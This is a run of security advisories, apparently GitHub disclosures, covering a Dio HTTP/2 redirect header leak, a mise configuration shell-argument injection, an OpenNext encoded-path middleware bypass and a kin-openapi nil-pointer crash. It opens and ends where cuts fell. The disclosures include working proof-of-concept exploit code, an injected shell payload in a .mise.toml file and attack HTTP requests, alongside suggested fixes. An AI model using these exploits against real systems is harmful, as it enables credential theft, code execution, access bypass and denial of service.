local compatibility check changed two existing missing-path-parameter tests from HTTP
400 semantics to route-not-found HTTP 404 semantics. A direct router swap is therefore
not a fully validated drop-in fix.

## Public-reference triage

The public advisory list and related path-encoding reports reviewed on 2026-08-18 did
not describe this authentication-boundary crossing. Relevant nearby reports include
issues #397, #1089, and #1105 and PR #400. This search is not proof of novelty; please
deduplicate against private reports.

## Credit

Preferred credit: Satoru Kanno (GMO CONNECT Inc., GMO Internet Group, Inc.)

summary: Dio: Cross-origin redirect leaks sensitive request headers in `dio_http2_adapter`
description:
### Summary

`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.

### Details

When `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:111
headers.addAll(
  options.headers.entries.map((entry) {
    ...
    return Header.ascii(entry.key.toLowerCase(), v);
  }).toList(),
);
```

On receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263
final url = responseHeaders.value('location');
final uri = Uri.parse(url ?? '');
final String path = resolveRedirectUri(options.uri, uri).toString();
return _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);
```

`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.

**Data flow (source → sink):**

1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.
2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.
3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.
4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).
5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.
6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.
7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.
8. `plugins/http2_adapter/lib/src/http2_adapter.dart:111` — preserved headers emitted verbatim to the cross-origin HTTP/2 request (sink).

**Suggested patch** — strip sensitive headers before following a cross-origin redirect:

```diff
--- a/plugins/http2_adapter/lib/src/http2_adapter.dart
+++ b/plugins/http2_adapter/lib/src/http2_adapter.dart
+  static const _sensitiveRedirectHeaders = {
+    'authorization',
+    'cookie',
+    'proxy-authorization',
+  };
+
-      final String path = resolveRedirectUri(options.uri, uri).toString();
+      final redirectUri = resolveRedirectUri(options.uri, uri);
+      final redirectOptions = options.copyWith(
+        path: redirectUri.toString(),
+        maxRedirects: --options.maxRedirects,
+      );
+      if (!_sameOrigin(options.uri, redirectUri)) {
+        redirectOptions.headers.removeWhere(
+          (name, _) => _sensitiveRedirectHeaders.contains(name.toLowerCase()),
+        );
+      }
       return _fetch(
-        options.copyWith(path: path, maxRedirects: --options.maxRedirects),
+        redirectOptions,
         list != null ? Stream.fromIterable(list) : null,
         cancelFuture,
         redirects,
       );
+
+  static bool _sameOrigin(Uri a, Uri b) =>
+      a.scheme == b.scheme && a.host == b.host && a.port == b.port;
```

### PoC

The following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).

**Prerequisites:**

- Docker installed and accessible.
- Repository checked out at the path used as the build context.

**Build and run:**

```bash
# From the repository root (github_web_81_cfug__dio/)
docker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .
docker run --rm --network none dio-vuln-001:poc
```

**What the container does:**

1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.
2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.
3. Executes the following Dart exploit:

```dart
final dio = Dio()
  ..httpClientAdapter = Http2Adapter(ConnectionManager());
await dio.get(
  'http://127.0.0.1:18081/start',
  options: Options(headers: {
    'Authorization': 'Bearer SECRET_TOKEN_12345',
    'Cookie': 'sid=SECRET_SESSION_ABC',
    'x-secret': 'internal-secret-value',
  }),
);
```

**Expected output (confirms vulnerability):**

```
RESULT=VULN_CONFIRMED
LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
LEAKED_COOKIE=sid=SECRET_SESSION_ABC

[ATTACKER] Received headers:
[ATTACKER]   authorization: Bearer SECRET_TOKEN_12345
[ATTACKER]   cookie: sid=SECRET_SESSION_ABC
[ATTACKER]   x-secret: internal-secret-value
```

The attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.

### Impact

This is a **sensitive information disclosure** vulnerability. Any application that:

1. configures `Dio` with `Http2Adapter`, and
2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,

is affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.

An attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.

Affected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 dynamic reproduction
# Vulnerability: Cross-origin redirect leaks sensitive request headers in dio_http2_adapter
#
# Build context: the parent directory (github_web_81_cfug__dio/)
#   docker build -f vuln-001/Dockerfile -t dio-vuln-001 .
#
# What this image does:
#   1. Installs Dart SDK (stable)
#   2. Copies the vulnerable repository source (dio + dio_http2_adapter)
#   3. Creates a PoC Dart project using path dependencies to the local source
#   4. Resolves pub packages
#   5. On container run: executes the exploit script that starts two local
#      h2c servers (origin + attacker) and makes a redirected request to prove
#      that Authorization/Cookie headers are forwarded to the cross-origin target

FROM dart:stable AS builder

# ── Repository source ──────────────────────────────────────────────────────────
# Copy only the packages we need to keep image small
COPY repo/dio/ /repo/dio/
COPY repo/plugins/http2_adapter/ /repo/plugins/http2_adapter/

# ── PoC project setup ──────────────────────────────────────────────────────────
WORKDIR /poc

COPY vuln-001/poc_pubspec.yaml pubspec.yaml
COPY vuln-001/poc_exploit.dart lib/main.dart

# Resolve dependencies (requires network access to pub.dev for http2, meta, etc.)
RUN dart pub get

# ── Runtime image (reuse builder to keep it simple) ────────────────────────────
FROM builder AS final

WORKDIR /poc

# Run the exploit; exit code:
#   0 = VULN_CONFIRMED (authorization header leaked to attacker)
#   1 = NOT_VULNERABLE  (header was stripped or redirect not followed)
#   2 = FAIL            (attacker server never received a request — env issue)
CMD ["dart", "run", "lib/main.dart"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC orchestrator for VULN-001:
  Cross-origin redirect leaks sensitive request headers in dio_http2_adapter.

Usage:
    python3 poc.py [--image-tag TAG]

What it does:
    1. Builds a Docker image containing the vulnerable dio_http2_adapter source
       and a Dart exploit script (poc_exploit.dart).
    2. Runs the container, which:
         a. Starts two local h2c (HTTP/2 cleartext) servers inside the container:
              - Origin  (127.0.0.1:18081): returns 302 → attacker
              - Attacker (127.0.0.1:18082): logs all received headers
         b. Uses dio + Http2Adapter to GET http://origin/start with
            Authorization and Cookie headers.
         c. Follows the 302 redirect to the attacker server.
         d. Reports whether the Authorization header was captured by the attacker.
    3. Writes phase2_result.json with structured verdict.

Exit codes:
    0  PASS   — vulnerability confirmed
    1  FAIL   — not reproduced
    2  ERROR  — build or runtime environment problem
"""

import argparse
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

# ── Paths ──────────────────────────────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent          # github_web_81_cfug__dio/
RESULT_FILE = SCRIPT_DIR / "phase2_result.json"

BUILD_CONTEXT = str(REPO_ROOT)
DOCKERFILE = str(SCRIPT_DIR / "Dockerfile")
DEFAULT_IMAGE_TAG = "dio-vuln-001:poc"


def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess command, streaming stdout/stderr to the terminal."""
    print(f"[+] {' '.join(cmd)}", flush=True)
    return subprocess.run(cmd, **kwargs)


def build_image(tag: str) -> bool:
    """Build the Docker image. Returns True on success."""
    result = run(
        [
            "docker", "build",
            "--file", DOCKERFILE,
            "--tag", tag,
            BUILD_CONTEXT,
        ],
        check=False,
    )
    if result.returncode != 0:
        print(f"[!] Docker build failed (exit {result.returncode})", file=sys.stderr)
        return False
    return True


def run_container(tag: str, timeout_sec: int = 120) -> tuple[int, str, str]:
    """
    Run the container and capture its output.

    Returns:
        (returncode, stdout, stderr)
    """
    result = run(
        [
            "docker", "run",
            "--rm",
            "--network", "none",   # no external network; loopback only
            tag,
        ],
        capture_output=True,
        text=True,
        timeout=timeout_sec,
        check=False,
    )
    return result.returncode, result.stdout, result.stderr


def parse_output(stdout: str, stderr: str) -> dict:
    """
    Parse structured key=value lines from the exploit's stdout.

    The Dart exploit writes lines like:
        RESULT=VULN_CONFIRMED
        LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
        EVIDENCE=...
    """
    parsed = {}
    for line in stdout.splitlines():
        if "=" in line:
            key, _, val = line.partition("=")
            parsed[key.strip()] = val.strip()
    return parsed


def write_result(data: dict) -> None:
    with open(RESULT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n[+] Result written to {RESULT_FILE}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--image-tag", default=DEFAULT_IMAGE_TAG,
        help=f"Docker image tag (default: {DEFAULT_IMAGE_TAG})",
    )
    args = parser.parse_args()
    tag = args.image_tag

    build_cmd = (
        f"docker build -f vuln-001/Dockerfile -t {tag} ."
    )
    run_cmd = (
        f"docker run --rm --network none {tag}"
    )
    poc_cmd = (
        f"cd {REPO_ROOT} && {build_cmd} && {run_cmd}"
    )

    # ── Step 1: Build ──────────────────────────────────────────────────────────
    print("=" * 70)
    print("STEP 1: Building Docker image")
    print("=" * 70)
    if not build_image(tag):
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": "Docker image build failed — dart pub get or source copy error",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "docker build non-zero exit code",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    # ── Step 2: Run exploit ────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("STEP 2: Running exploit container")
    print("=" * 70)

    try:
        returncode, stdout, stderr = run_container(tag)
    except subprocess.TimeoutExpired:
        result_data = {
            "passed": False,
            "verdict": "INCOMPLETE",
            "reason": "Container execution did not complete within 120 seconds and was terminated due to timeout",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "subprocess.TimeoutExpired after 120 s",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    print("\n── Container STDOUT ─────────────────────────────────────────────")
    print(stdout or "(empty)")
    print("── Container STDERR ─────────────────────────────────────────────")
    print(stderr or "(empty)")
    print("── Exit code:", returncode, "─────────────────────────────────────")

    # ── Step 3: Evaluate results ───────────────────────────────────────────────
    parsed = parse_output(stdout, stderr)
    exploit_result = parsed.get("RESULT", "")
    leaked_header = parsed.get("LEAKED_HEADER", "")
    evidence_line = parsed.get("EVIDENCE", "")

    if returncode == 0 and exploit_result == "VULN_CONFIRMED" and leaked_header:
        # Combine stdout + a snippet of stderr for the evidence field
        stderr_snippet = "\n".join(
            line for line in stderr.splitlines()
            if any(tag in line for tag in ("[ATTACKER]", "[RESULT]", "[EVIDENCE]"))
        )[:1500]
        evidence = (
            f"stdout: {stdout.strip()}\n\n"
            f"stderr (relevant):\n{stderr_snippet}"
        )
        result_data = {
            "passed": True,
            "verdict": "PASS",
            "reason": (
                "dio_http2_adapter forwarded the original Authorization header verbatim "
                "to the attacker's server without stripping it when following a "
                "cross-origin 302 redirect. The attacker h2c server (127.0.0.1:18082) "
                f"received '{leaked_header}'."
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": evidence,
            "artifacts": [
                "Dockerfile",
                "poc_exploit.dart",
                "poc_pubspec.yaml",
                "poc.py",
            ],
        }
        write_result(result_data)
        print("\n[PASS] VULN-001 reproduced successfully.")
        return 0

    elif returncode == 1 or exploit_result == "NOT_VULNERABLE":
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": (
                "Container execution succeeded, but the attacker server did not "
                "receive the Authorization header. The vulnerability was not "
                f"reproduced in this environment. Parsed result: {parsed}"
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
```

summary: mise permits untrusted local configuration to override default shell arguments
description:
## Summary

Untrusted local .mise.toml [settings] can set the shell interpreter args (unix/windows default_inline / default_file shell_args), yielding arbitrary command execution, because those command-interpreter settings were not added to the global_only denylist the CVE-2026-55448 fix relies on. Code execution from an untrusted repository with no trust prompt for the malicious file, on par with the patched CVE. Confirmed at HEAD 7160170206782fdd3ef287c8302369e32152fb71.

## The defect

CVE-2026-55448 and CVE-2026-35533 fixed the fact that a local project [settings] table is harvested by the settings preloader independent of the trust store (an untrusted .mise.toml sets settings without the user ever trusting it). The remediation is a per-field global_only denylist: settings marked global_only are stripped from non-global config. The maintainers marked the command-execution fields they knew about (the three forge credential_command values) but did not mark the four shell-interpreter-args settings, which are also command-execution settings because they choose the interpreter for every command mise spawns.

The global_only denylist and the gap. In settings.toml, the three credential_command sinks are global_only (forgejo.credential_command around line 775, github.credential_command around 828, gitlab.credential_command around 990). The four shell-args settings do not carry global_only:

- unix_default_file_shell_args (settings.toml around 2920)
- unix_default_inline_shell_args (around 2926)
- windows_default_file_shell_args (around 3004)
- windows_default_inline_shell_args (around 3010)

The strip logic only removes global_only keys. src/config/settings.rs strip_local_only_settings (line 409) filters by meta.global_only (line 416: `filter_map(|(key, meta)| meta.global_only.then_some(*key))`), so any field not marked global_only survives from a local untrusted config. The settings preload loads every config path including the local project file (all_settings_files, line 778), and in default (non-safe) mode there is no trust check (safe_mode defaults false, line 1141).

The sink. src/config/settings.rs default_inline_shell (line 1032) reads self.unix_default_inline_shell_args (line 1040), and default_file_shell reads unix_default_file_shell_args. Settings::get returns the merged global-plus-local value minus global_only, so the untrusted project value overrides the built-in default (sh -c -o errexit).

Injection semantics. The real command is appended after the attacker's args, so PAYLOAD runs and the real command is demoted to $0:

- tera inline exec builtin: src/tera.rs (tera1_exec around 1358, and around 1470) builds shell[1..] + [command] with program = shell[0]. An attacker unix_default_inline_shell_args = "sh -c 'PAYLOAD'" yields sh -c 'PAYLOAD' <command>.
- postinstall runner: src/backend/mod.rs around 2405 calls cmd_body_args(shell_args, body); src/cmd.rs cmd_body_args (non-Windows, around 520) returns program flags... body, the same demotion.
- task execution: src/task/task_executor.rs (around 916, 939, 993) uses task.shell()?.unwrap_or(default_inline_shell()/default_file_shell()), so a trusted task with no explicit shell (the common case) runs through the attacker's interpreter.
- hooks: src/hooks.rs (around 540, 603) also fall back to default_inline_shell().

## Attacker model and reachability

An untrusted repository the developer clones and cd's into. The attacker's .mise.toml sits in the working directory or any ancestor and is never trusted by the victim; its [settings] table is harvested by the preloader independent of the trust store, exactly as the two prior CVEs established. The executed command can come from a trusted or global source; only the interpreter is attacker-controlled. Any of these, run while the untrusted .mise.toml is in an ancestor directory, fires it: mise run <task> for a task defined in the global config or a trusted parent repo (inline run, no explicit shell); mise install of any tool with a postinstall directive; any tera template that calls exec(...) in the victim's own trusted or global config; a directory-enter hook from any trusted config in scope.

Proof of concept. In an untrusted repo, .mise.toml:

```toml
[settings]
unix_default_inline_shell_args = "sh -c 'id > /tmp/mise_pwned'"
```

The victim cd's in (does not trust the file) and later runs any global or trusted-parent task with no explicit shell, or mise install of a tool with a postinstall, or a config that renders {{ exec(...) }}. mise builds `sh -c 'id > /tmp/mise_pwned' <realcommand>`, so the payload runs.

## Verification

Source-verified at HEAD: the four shell-args settings lack global_only while the credential_command sinks have it, strip_local_only_settings removes only global_only keys, default_inline_shell reads the setting, and the exec/postinstall/task paths append the real command after the attacker args. The load path is the same one two shipped CVEs already proved reachable. I did not run mise end to end.

## Suggested fix

Mark all four *_default_*_shell_args settings global_only = true (the same treatment as credential_command), or flip the default-mode policy to an allowlist so any setting not explicitly known-safe is stripped from non-global config.

Secondary note (weaker, not the main finding): the CVE-2026-54557 path-sanitization fix added sanitize_install_version_name only inside the HTTP backend (src/backend/http.rs around 628), while the general path builder ToolVersion::tv_pathname (src/toolset/tool_version.rs around 292) still only replaces ':' and '/' and does not neutralize '..' or backslash. Impact is narrow (one level up, stays in the mise data dir on Unix), so this is a hardening note, not a primary finding.

## Tooling

AI assistance was used while investigating, but the researcher read strip_local_only_settings (confirming it strips only global_only), the settings.toml entries (confirming the four shell-args settings lack global_only while credential_command has it), default_inline_shell (confirming it reads the setting), and the exec/postinstall/task invocation sites (confirming the real command is appended after the attacker args) themself at HEAD, so the incomplete fix is source-verified.

summary: OpenNext Cloudflare: Cache interception can bypass middleware protection for encoded paths
description:
## Summary

When cache interception is enabled, `@opennextjs/cloudflare` can interpret percent-encoded paths differently during middleware matching and cache lookup.

An encoded request may fail to match authorization middleware, then be decoded into the cache key of a protected route. The cached response may consequently be returned without invoking the middleware.

`enableCacheInterception` is disabled by default.

## Impact

A remote unauthenticated attacker may retrieve cached content from routes intended to be protected by middleware.

An application is affected when it:

- explicitly enables `enableCacheInterception`;
- relies on middleware for access control; and
- has a matching cached route.

## Details

Middleware matching previously used the encoded request pathname, while cache interception decoded the pathname before selecting a cache entry.

For example, consider an application with:

- middleware matcher `/admin/:path*`;
- middleware returning `401 Authentication required` for `/admin`;
- a statically generated, cached `/admin` route; and
- cache interception enabled:

```ts
export default defineCloudflareConfig({
  incrementalCache: staticAssetsIncrementalCache,
  enableCacheInterception: true,
});
```

An attacker can request:

```http
GET /%61dmin
```

The encoded pathname does not match `/admin/:path*`, so the authorization middleware is not invoked. Cache interception then decodes `%61dmin` to `admin` and may return the cached `/admin` response:

```http
HTTP/1.1 200 OK
x-opennext-cache: HIT

Protected content
```

Malformed paths exposed an additional inconsistency. For example:

```http
GET /%61dmin/%ZZ
```

The previous implementation decoded each segment independently. It decoded `%61dmin` to `admin` but retained the malformed `%ZZ` segment, allowing cache lookup to continue using a partially decoded pathname.

## Patches

The fix aligns encoded-path handling across middleware matching and cache lookup, and rejects malformed paths instead of partially decoding them. See the upstream fixes in [opennextjs-aws#1199](https://github.com/opennextjs/opennextjs-aws/pull/1199) and [opennextjs-aws#1200](https://github.com/opennextjs/opennextjs-aws/pull/1200).

Users should upgrade to `@opennextjs/cloudflare@1.20.2` or later.

## Workarounds

If upgrading is not immediately possible for an application:

1. Disable cache interception by removing `enableCacheInterception: true`.
2. Enforce authorization inside protected route handlers rather than relying exclusively on middleware.
3. Reject encoded paths for protected routes at a trusted proxy before they reach the Worker.

Adding individual encoded matcher variants is not a complete workaround because pathnames can have multiple equivalent encodings.

summary: kin-openapi: Nil-pointer dereference panic in openapi3filter for OpenAPI 3.1 array schemas missing items
description:
### Summary

A nil-pointer dereference in `openapi3filter` lets any unauthenticated client crash a request handler with a single HTTP request against an OpenAPI **3.1** operation that declares `type: array` **without** `items`. OpenAPI 3.1 (JSON Schema 2020-12) permits omitting `items`, and `doc.Validate()` accepts such schemas with `Schema.Items == nil`. Request/response decoders then dereference `Items` with no nil check. The panic is **deterministic (100%)** on every request to the affected operation. There is no `recover()` in `openapi3filter`; under handlers without per-request recover the process can exit.

### Details

**Spec-validation asymmetry.** OpenAPI 3.0 rejects array schemas that omit `items` ([`openapi3/schema.go`](https://github.com/getkin/kin-openapi/blob/master/openapi3/schema.go) around the `TypeArray` / `newSchemaItemsRequired` branch). For OpenAPI 3.1, `T.Validate` enables `jsonSchema2020ValidationEnabled`, so that check is skipped and `Schema.Items` remains nil after a clean `doc.Validate()`.

**Vulnerable decoder.** The primary request-side crash is in [`UrlencodedBodyDecoder`](https://github.com/getkin/kin-openapi/blob/master/openapi3filter/req_resp_decoder.go) (still present on this checkout at L1421):

```go
case propType.Is("array"):
    items := propSchema.Value.Items.Value  // Items == nil → panic
```

This runs during schema inspection **before** form values are parsed. Any non-empty `application/x-www-form-urlencoded` body for the operation reaches the dereference (an empty body is rejected earlier when `requestBody.required` is true, and never enters the decoder).

The same nil `Items` also crashes:

| Path | Location | Trigger |
|---|---|---|
| `MultipartBodyDecoder` | `req_resp_decoder.go` ~1564 → 1579 | `multipart/form-data` part named like the array property |
| `parseArray` → `parsePrimitive` | `req_resp_decoder.go` ~1129 / 1151 | Array-typed **response headers** via `ValidateResponse`, and path/cookie array params |

`Middleware` / `ValidationHandler` call `ValidateRequest` / `ValidateResponse` directly with no recover, so the panic escapes the library into the application.

**Recommended fix.** Guard nil `Items` and return a structured decode/validation error, e.g.:

```diff
 case propType.Is("array"):
+	if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil {
+		return nil, fmt.Errorf("unsupported schema of request body's property %q: array items required for decoding", propName)
+	}
 	items := propSchema.Value.Items.Value
```

Apply equivalent guards in `MultipartBodyDecoder` and `parseArray` before calling `parsePrimitive`.

### PoC

Verified against revision `c11a4812ba7be3ee3d81453be0c397ee84c238d5`, Go 1.25, `darwin/arm64`.

**1. Spec** — OpenAPI 3.1 operation with urlencoded body and `type: array` property without `items`:

```yaml
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
```

**2. E2E program** — `net/http` server using the same public entrypoint (`gorillamux` → `openapi3filter.ValidateRequest`) real middleware uses. Save as `main.go` in a module that depends on `github.com/getkin/kin-openapi` at a vulnerable revision, then `go run .`:

```go
package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const spec = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

func main() {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(spec))
	if err != nil {
		log.Fatal(err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		log.Fatalf("doc.Validate rejected (unexpected for 3.1): %v", err)
	}
	fmt.Println("SPEC_ACCEPTED; Items ==", doc.Paths.Value("/f").Post.RequestBody.Value.
		Content.Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value.Items)

	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		log.Fatal(err)
	}

	// Direct call (no net/http recover): proves the library itself panics.
	req, _ := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pp, _ := router.FindRoute(req)
	func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("DIRECT_PANIC: %v\n", r)
			}
		}()
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pp, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		fmt.Println("DIRECT_PANIC: none (unexpected)")
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("/f", func(w http.ResponseWriter, r *http.Request) {
		route, pathParams, err := router.FindRoute(r)
		if err != nil {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request: r, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	addr := "127.0.0.1:8085"
	fmt.Printf("listening on http://%s/f\n", addr)
	fmt.Println("attack: curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://" + addr + "/f")
	log.Fatal(http.ListenAndServe(addr, mux))
}
```

**3. Observed output** (`go run .`):

```
SPEC_ACCEPTED; Items == <nil>
DIRECT_PANIC: runtime error: invalid memory address or nil pointer dereference
listening on http://127.0.0.1:8085/f
```

Then:

```
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'tags=a' http://127.0.0.1:8085/f
```

Server log:

```
http: panic serving 127.0.0.1:…: runtime error: invalid memory address or nil pointer dereference
… openapi3filter.UrlencodedBodyDecoder …/req_resp_decoder.go:1421
… openapi3filter.ValidateRequest …
```

Stack pins the fault to `UrlencodedBodyDecoder` at `req_resp_decoder.go:1421`, called from `ValidateRequest` → `ValidateRequestBody` → `decodeBody`.

**Attack request:**

```
POST /f HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

tags=a
```

(Any non-empty body is enough; form content is irrelevant because `Items` is dereferenced during schema inspection before parsing.)

**4. Regression / multi-surface test suite** — save as e.g. `openapi3filter/array_items_nil_panic_test.go` in a checkout of the module and run `go test -run TestArrayItemsNilPanic ./openapi3filter/ -v`:

```go
package openapi3filter_test

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const urlencodedSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const urlencodedSpec30 = `
openapi: 3.0.3
info: {title: t, version: 1.0.0}
paths:
  /f:
    post:
      requestBody:
        required: true
        content:
          application/x-www-form-urlencoded:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const multipartSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /upload:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                tags: {type: array}
      responses:
        '200': {description: ok}
`

const responseHeaderSpec31 = `
openapi: 3.1.0
info: {title: t, version: 1.0.0}
paths:
  /hdr:
    get:
      responses:
        '200':
          description: ok
          headers:
            X-Tags:
              schema: {type: array}
`

func catchPanic(fn func()) (panicValue any) {
	defer func() { panicValue = recover() }()
	fn()
	return nil
}

func TestArrayItemsNilPanic_OpenAPI31Accepts(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	schema := doc.Paths.Value("/f").Post.RequestBody.Value.Content.
		Get("application/x-www-form-urlencoded").Schema.Value.Properties["tags"].Value
	require.True(t, schema.Type.Is("array"))
	require.Nil(t, schema.Items)
}

func TestArrayItemsNilPanic_OpenAPI30Rejects(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec30))
	require.NoError(t, err)
	require.Error(t, doc.Validate(loader.Context))
}

func TestArrayItemsNilPanic_UrlencodedValidateRequest(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(urlencodedSpec31))
	require.NoError(t, err)
	require.NoError(t, doc.Validate(loader.Context))
	router, err := gorillamux.NewRouter(doc)
	require.NoError(t, err)

	req, err := http.NewRequest(http.MethodPost, "/f", strings.NewReader("tags=a"))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	route, pathParams, err := router.FindRoute(req)
	require.NoError(t, err)

	got := catchPanic(func() {
		_ = openapi3filter.ValidateRequest(loader.Context, &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
```
